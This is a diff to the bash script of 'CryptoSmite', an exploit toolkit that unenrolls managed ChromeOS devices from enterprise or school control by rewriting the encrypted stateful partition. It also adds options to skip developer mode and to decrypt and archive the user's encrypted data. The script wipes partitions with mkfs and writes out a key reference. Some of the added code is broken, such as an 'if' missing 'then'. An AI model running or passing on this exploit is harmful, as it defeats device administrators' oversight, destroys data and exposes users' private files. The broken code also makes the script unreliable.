@@ -7,17 +7,29 @@
 #
 
 set -eE
-
+UNENROLL=1
+ACTION1="erase"
+ACTION2="unenroll"
+USE_BACKUP=0
+CONTINUE=0
 print_welcome() {
-    echo "Welcome to the CryptoSmite toolkit"
+    echo "Welcome to the CryptoSmite toolkit (2024)"
     echo "Please look at the following options: "
     echo "(1) Unenrollment"
-	echo "(2) Re-enrollment *not-implemented*"
+	echo "(2) Extract stateful (needed for re-enrollment)"
 	echo "(3) Skip Devmode"
+	echo "(4) Restore backup (this may or may not re-enroll you, DO NOT TRUST ANY BACKUP THAT YOU FIND ON THE INTERNET, ONLY USE BACKUPS CREATED BY THE REENROLLMENT TOOLKIT)"
+	echo "	They may have keyloggers or other extensions installed, and may compromise your login info."
 	echo "(q) Quit"
+	CONTINUE=1
 }
+mkdir -p /mnt/stateful_partition
 reenroll() {
-	echo "Not implemented"
+	# sets unenroll to zero, so it mounts and has same behaviour. This caused problems with the original cryptocrafter script
+	UNENROLL=0
+	ACTION1="read"
+	ACTION2="capture all data on"
+	CONTINUE=1
 }
 skip_devmode() {
 	clear
@@ -26,11 +38,15 @@ skip_devmode() {
 	mount -o loop,rw /dev/mmcblk0p1 /tmp
 	touch /tmp/.developer_mode
 	umount /tmp && sync
-	reboot
+	reboot -f
+	exit 0 #if reboot fails for some weird reason
+}
+restore_backup() {
+	USE_BACKUP=1
 }
 confirm_choice() {
-	# Argument 1 is the function/string to confirm. Will synchronously block and execute the function,
-	# if the user confirms. The function will decide whether it should reboot, exit, or return to the main menu. 
+	# Argument 1 is the function/string to confirm. 
+	# If the user confirms: The function will decide whether it should reboot, exit, or return to the main menu. 
 	# Otherwise exits back to the main menu loop.
 	while true
 	do
@@ -61,7 +77,11 @@ echo "-------------CryptoSmite------------"
 selected_choice=""
 while true
 do
-    # Decided not to refactor unenroll into a bash function, and only add new functions in function to exit pair
+	if [ $CONTINUE -gt 0 ]
+	then
+		break
+	fi
+    # Decided not to refactor unenroll into a bash function, and only add new functions that will get called, and determine if they should exit/reboot. See `confirm_choice`
     clear
     print_welcome
     read -p "Select choice: " -r selected_choice
@@ -71,13 +91,14 @@ do
 		break
         ;;
     2)
-        reenroll
-		exit 0
+        confirm_choice reenroll
         ;;
     3)
-        skip_devmode
-		exit 0
+        confirm_choice skip_devmode
         ;;
+	4)
+		confirm_choice restore_backup
+		;;
     q)
         echo "Quitting now"
         sleep 0.8
@@ -94,8 +115,15 @@ CRYPTSETUP_PATH=/usr/local/bin/cryptsetup_$(arch)
 mount -o rw /dev/sda1 /mnt/stateful_partition
 chmod +x /usr/local/bin/cryptsetup_aarch64
 chmod +x /usr/local/bin/cryptsetup_x86_64
-SCRIPT_DATE="[2024-01-28]"
+SCRIPT_DATE="[2024-03-19]"
 BACKUP_PAYLOAD=/mnt/stateful_partition/stateful.tar.xz
+clear
+if [ $USE_BACKUP -gt 0 ]
+then
+	echo "Please type in your encstateful path below"
+	read -p ">" stateful_path
+	BACKUP_PAYLOAD=$stateful_path
+fi
 NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB
 
 [ -z "$SENSITIVE_MODE" ] && SENSITIVE_MODE=0
@@ -174,7 +202,7 @@ clear
 echo "Welcome to Cryptosmite."
 echo "Script date: ${SCRIPT_DATE}"
 echo ""
-echo "This will destroy all data on ${TARGET_PART} and unenroll the device."
+echo "This will ${ACTION1} all data on ${TARGET_PART} and ${ACTION2} the device."
 echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
 echo "Continue? (y/N)"
 read -r action
@@ -183,31 +211,54 @@ case "$action" in
 	*) fail "Abort." ;;
 esac
 
-echo_sensitive "Wiping and mounting stateful"
-mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
+if [ ${UNENROLL} -gt 0 ]
+	echo_sensitive "Wiping and mounting stateful"
+	mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
+else
+	echo "Not wiping stateful"
+fi
 STATEFUL_MNT=$(mktemp -d)
 mkdir -p "$STATEFUL_MNT"
 mount "$TARGET_PART" "$STATEFUL_MNT"
 
 echo_sensitive "Setting up encstateful"
-truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block
+truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block # this keeps data, so we can actually read the old data
 ENCSTATEFUL_KEY=$(mktemp)
 key_ecryptfs > "$ENCSTATEFUL_KEY"
 ${CRYPTSETUP_PATH} open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$STATEFUL_MNT"/encrypted.block encstateful
 
-echo_sensitive "Wiping and mounting encstateful"
-mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
+
+if [ $UNENROLL -eq 0 ]
+then
+	echo "Not wiping stateful for extracting of data from stateful"
+else
+	echo "Wiping and mounting encstateful"
+	mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
+fi
 ENCSTATEFUL_MNT=$(mktemp -d)
 mkdir -p "$ENCSTATEFUL_MNT"
 mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"
 
+if [ $UNENROLL -eq 0 ]
+then
+	echo "Backing up data!"
+	tar -czf /mnt/stateful_partition/saved.tar.gz $ENCSTATEFUL_MNT
+	echo "Successfully extracted encstateful data! DO NOT SHARE THIS WITH ANYONE that you don't know, as it may contain sensitive information. WE WILL NEVER ASK YOU FOR THIS BACKUP!"
+fi
+
 echo_sensitive "Dropping encstateful key"
 key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization
+echo $ENCSTATEFUL_KEY > /mnt/stateful_partition/enc.key
 
-echo_sensitive -n "Extracting backup to encstateful"
-tar -xf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
-echo ""
-
+if [ $UNENROLL -eq 0 ]
+then
+	echo "Not restoring backup to encstateful for unenrollment, since the encstateful key has dropped, your next sesson will use the encstateful key (if you used cryptosmite before this without powerwashing)"
+	echo ""
+else
+	echo_sensitive -n "Extracting backup to encstateful"
+	tar -xf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
+	echo ""
+fi
 echo "Cleaning up"
 cleanup
 
@@ -222,4 +273,5 @@ echo ""
 echo "Rebooting in 3 seconds"
 sleep 3
 reboot -f
+echo "If your device hasn't rebooted, press refresh+power."
 sleep infinity
